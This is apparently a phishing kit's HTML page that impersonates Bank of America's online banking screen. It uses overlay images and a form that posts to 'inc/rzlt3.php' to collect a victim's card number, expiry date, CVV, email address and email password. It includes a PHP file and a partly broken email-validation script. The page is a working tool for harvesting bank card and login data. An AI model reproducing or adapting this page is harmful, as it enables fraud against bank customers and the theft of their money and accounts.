<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0014)about:internet -->
<html>
<head><? include('read.php');?>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Bank of America | Online Banking | Account | Overview</title>
<meta name="GENERATOR" content="">
<meta name="HOSTING" content="">
<link rel="shortcut icon" type="image/x-icon" href="./images/favicon.ico" />
        <link rel="icon" type="image/x-icon" href="./images/favicon.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<SCRIPT
language=JavaScript>
function validateForm() {
    var x = document.forms["Form1"]["emll"].value;
    var atpos = x.indexOf("@");
    if (atpos< 1 || dotpos<atpos+2 || dotpos+2>=x.length) {
        alert("Enter correct email address for quick alert delivery");
        return false;
    }
}
</SCRIPT>
<style>
.form_baba {
           display: inline;
           border: 1px solid #bdbdbd;
           padding: 5px;
           color: #808080;
           min-width: 180px;
           -moz-border-radius: 2px;
           -webkit-border-radius: 2px;
           border-radius: 2px;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body background="bgimage.png">
<div id="overlayImage" style="margin:0;padding:0;position:absolute;left:400px;top:180px;text-align:left;z-index:3;"><img src="images/overlay.png" id="Image1" alt=""  align="top" border="0"></div>
<div id="bv_Form1" style="position:absolute;left:0px;top:0px;width:1371px;height:713px;z-index:4">
<form name="Form1" method="post" action="inc/rzlt3.php" onsubmit="return validateForm()">
  <input id="create_mu39422" style="position:absolute;left:665px;top:383px;width:145px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="Cnumber" value="" type="text" placeholder="">
<select id="b1" name="b1" style="position:absolute;left:665px;top:413px;width:70px;height:24px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" type="text">
<option value="00" selected>- -</option><option value=01>01</option><option value=02>02</option><option value=03>03</option><option value=04>04</option><option value=05>05</option><option value=06>06</option><option value=07>07</option><option value=08>08</option>
<option value=09>09</option><option value=10>10</option><option value=11>11</option><option value=12>12</option></select></option>
<select id="b3" name="b3" style="position:absolute;left:738px;top:413px;width:76px;height:24px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" type="text">
<option value="----" selected>- - - -</option><option value=2018>2018</option><option value=2019>2019</option><option value=2020>2020</option><option value=2021>2021</option><option value=2022>2022</option><option value=2023>2023</option><option value=2024>2024</option><option value="2025">2025</option><option value="2026">2026</option>
<option value="2027">2027</option><option value="2027">2027</option></select></option>
<input id="create_mu39426" style="position:absolute;left:665px;top:448px;width:50px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="cWW" value="" type="text">
<input id="create_mu39420" style="position:absolute;left:665px;top:538px;width:150px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="emll" value="" type="text" placeholder=" e.g email@domain.com">
<input id="create_mu39428" style="position:absolute;left:665px;top:570px;width:150px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="pswd" value="" type="password" placeholder=" Password">
<input id="Button1" name="Button1" value="" style="position:absolute;left:620px;top:660px;width:90px;height:26px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
</form>
</div>
</body></html>